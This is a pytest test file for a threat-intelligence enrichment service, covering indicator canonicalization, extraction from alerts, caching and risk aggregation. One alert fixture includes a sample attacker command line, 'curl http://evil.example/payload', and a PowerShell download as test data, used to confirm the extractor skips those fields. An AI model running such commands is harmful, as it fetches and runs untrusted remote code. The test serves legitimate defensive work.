import asyncio
from datetime import datetime, timedelta, timezone
from uuid import UUID, uuid4

import pytest

from app.models.threat_intel import AlertThreatIntel, ThreatIntelIndicator
from app.schemas.normalized_alert import NormalizedAlert, NormalizedHost, NormalizedNetwork, NormalizedProcess, NormalizedFile
from app.schemas.threat_intel import ThreatIntelProviderResult
from app.services.threat_intel.indicators import (
    InvalidIndicatorError,
    canonicalize_indicator,
    extract_indicators,
)
from app.services.threat_intel.providers import OfflineThreatIntelProvider
from app.services.threat_intel.scoring import aggregate_provider_results
from app.services.threat_intel.service import ThreatIntelService


class _Clock:
    def __init__(self, value: datetime) -> None:
        self.value = value

    def __call__(self) -> datetime:
        return self.value


class _CountingProvider:
    name = "counting"
    supported_types = frozenset({"ip", "domain", "hash", "url"})

    def __init__(self) -> None:
        self.calls: list[tuple[str, str]] = []

    async def lookup(self, indicator_type: str, indicator: str) -> ThreatIntelProviderResult:
        self.calls.append((indicator_type, indicator))
        scores = {"ip": 20, "domain": 30, "hash": 80, "url": 45}
        verdicts = {"ip": "unknown", "domain": "unknown", "hash": "malicious", "url": "suspicious"}
        return ThreatIntelProviderResult(
            provider=self.name,
            verdict=verdicts[indicator_type],
            risk_score=scores[indicator_type],
            confidence=90,
            summary=f"looked up {indicator_type}",
        )


class _StaticProvider:
    def __init__(self, name: str, risk_score: int, verdict: str) -> None:
        self.name = name
        self.risk_score = risk_score
        self.verdict = verdict
        self.supported_types = frozenset({"ip"})

    async def lookup(self, indicator_type: str, indicator: str) -> ThreatIntelProviderResult:
        return ThreatIntelProviderResult(
            provider=self.name,
            verdict=self.verdict,
            risk_score=self.risk_score,
            confidence=80,
            summary=f"{self.name} result",
        )


class _MemoryThreatIntelService(ThreatIntelService):
    def __init__(self, providers, *, clock) -> None:
        super().__init__(providers=providers, clock=clock)
        self.rows: dict[tuple[str, str], ThreatIntelIndicator] = {}
        self.associations: set[tuple[UUID, UUID, str]] = set()

    async def _find_indicator(self, _db, indicator_type: str, indicator: str) -> ThreatIntelIndicator | None:
        return self.rows.get((indicator_type, indicator))

    async def _upsert_indicator(
        self,
        _db,
        *,
        row: ThreatIntelIndicator | None,
        indicator_type: str,
        indicator: str,
        providers: dict[str, ThreatIntelProviderResult],
        risk_score: int,
        verdict: str,
        cached_until: datetime,
        last_lookup_at: datetime,
    ) -> ThreatIntelIndicator:
        provider_payload = {name: result.model_dump(mode="json") for name, result in providers.items()}
        if row is None:
            row = ThreatIntelIndicator(id=uuid4(), indicator_type=indicator_type, indicator=indicator)
            self.rows[(indicator_type, indicator)] = row
        row.providers = provider_payload
        row.risk_score = risk_score
        row.verdict = verdict
        row.cached_until = cached_until
        row.last_lookup_at = last_lookup_at
        return row

    async def _ensure_association(self, _db, alert_id: UUID, indicator_id: UUID, evidence_path: str) -> None:
        self.associations.add((alert_id, indicator_id, evidence_path))


@pytest.mark.parametrize(
    ("indicator_type", "value", "expected"),
    [
        ("ip", "010.010.010.010", None),
        ("ip", "2001:db8::1", "2001:db8::1"),
        ("domain", "Example.COM.", "example.com"),
        ("hash", "a" * 64, "A" * 64),
        ("url", "HTTPS://user:pass@Example.COM:443/a#frag", "https://example.com:443/a"),
    ],
)
def test_canonicalize_indicators(indicator_type, value, expected):
    if expected is None:
        with pytest.raises(InvalidIndicatorError):
            canonicalize_indicator(indicator_type, value)
    else:
        assert canonicalize_indicator(indicator_type, value) == expected


@pytest.mark.parametrize(
    ("indicator_type", "value"),
    [
        ("domain", "192.0.2.10"),
        ("hash", "not-a-hash"),
        ("url", "ftp://example.com/file"),
        ("email", "root@example.com"),
    ],
)
def test_invalid_indicators_are_rejected(indicator_type, value):
    with pytest.raises(InvalidIndicatorError):
        canonicalize_indicator(indicator_type, value)


def test_extract_indicators_uses_only_canonical_alert_fields_and_does_not_mutate_input():
    alert = NormalizedAlert(
        id=UUID("00000000-0000-0000-0000-000000000001"),
        timestamp=datetime(2026, 9, 16, tzinfo=timezone.utc),
        network=NormalizedNetwork(src_ip="8.8.8.8", url="https://Example.COM/download.exe"),
        process=NormalizedProcess(command_line="curl http://evil.example/payload", script_block="Invoke-WebRequest evil"),
        raw_ref="http://evil.example/raw-ref",
    )
    original = alert.model_dump()

    indicators = extract_indicators(alert)

    assert alert.model_dump() == original
    assert [(item.type, item.value, item.evidence_path) for item in indicators] == [
        ("ip", "8.8.8.8", "network.src_ip"),
        ("url", "https://example.com/download.exe", "network.url"),
        ("domain", "example.com", "network.url.host"),
    ]


def test_lookup_uses_cache_until_ttl_expires_and_refresh_bypasses_cache():
    async def scenario():
        clock = _Clock(datetime(2026, 9, 16, 12, 0, tzinfo=timezone.utc))
        provider = _CountingProvider()
        service = _MemoryThreatIntelService([provider], clock=clock)

        first = await service.lookup_ip(None, "8.8.8.8")
        second = await service.lookup_ip(None, "8.8.8.8")

        assert first.cached is False
        assert second.cached is True
        assert provider.calls == [("ip", "8.8.8.8")]

        clock.value += timedelta(hours=6, seconds=1)
        expired = await service.lookup_ip(None, "8.8.8.8")
        refreshed = await service.lookup_ip(None, "8.8.8.8", refresh=True)

        assert expired.cached is False
        assert refreshed.cached is False
        assert provider.calls == [("ip", "8.8.8.8"), ("ip", "8.8.8.8"), ("ip", "8.8.8.8")]

    asyncio.run(scenario())


@pytest.mark.parametrize(
    ("indicator_type", "value", "hours"),
    [
        ("ip", "8.8.8.8", 6),
        ("domain", "example.org", 12),
        ("hash", "a" * 64, 24),
        ("url", "https://example.org/path", 6),
    ],
)
def test_lookup_cache_ttls_match_roadmap(indicator_type, value, hours):
    async def scenario():
        now = datetime(2026, 9, 16, 12, 0, tzinfo=timezone.utc)
        service = _MemoryThreatIntelService([_CountingProvider()], clock=_Clock(now))

        result = await service.lookup(None, indicator_type, value)

        assert result.cached_until == now + timedelta(hours=hours)

    asyncio.run(scenario())


def test_enrich_alert_looks_up_duplicate_indicator_once_but_keeps_evidence_paths():
    async def scenario():
        clock = _Clock(datetime(2026, 9, 16, 12, 0, tzinfo=timezone.utc))
        provider = _CountingProvider()
        service = _MemoryThreatIntelService([provider], clock=clock)
        alert = NormalizedAlert(
            id=UUID("00000000-0000-0000-0000-000000000002"),
            timestamp=clock.value,
            host=NormalizedHost(ip="8.8.8.8"),
            network=NormalizedNetwork(src_ip="8.8.8.8", dst_ip="8.8.8.8"),
        )

        result = await service.enrich_alert(None, alert)
        cached = await service.enrich_alert(None, alert)

        assert provider.calls == [("ip", "8.8.8.8")]
        assert [item.evidence_path for item in result.indicators] == ["network.src_ip", "network.dst_ip", "host.ip"]
        assert len(service.associations) == 3
        assert all(item.cached for item in cached.indicators)

    asyncio.run(scenario())


def test_offline_provider_returns_bounded_fixture_reputation_without_network():
    async def scenario():
        now = datetime(2026, 9, 16, 12, 0, tzinfo=timezone.utc)
        service = _MemoryThreatIntelService([OfflineThreatIntelProvider()], clock=_Clock(now))

        private_ip = await service.lookup_ip(None, "10.10.10.50")
        malicious_hash = await service.lookup_hash(None, "a" * 64)

        assert private_ip.providers["offline"].summary
        assert private_ip.verdict == "benign"
        assert private_ip.risk_score == 0
        assert malicious_hash.verdict == "malicious"
        assert malicious_hash.risk_score == 85

    asyncio.run(scenario())


def test_provider_result_aggregation_is_deterministic():
    risk_score, verdict = aggregate_provider_results(
        {
            "one": ThreatIntelProviderResult(provider="one", verdict="suspicious", risk_score=45),
            "two": ThreatIntelProviderResult(provider="two", verdict="malicious", risk_score=80),
        }
    )

    assert risk_score == 85
    assert verdict == "malicious"
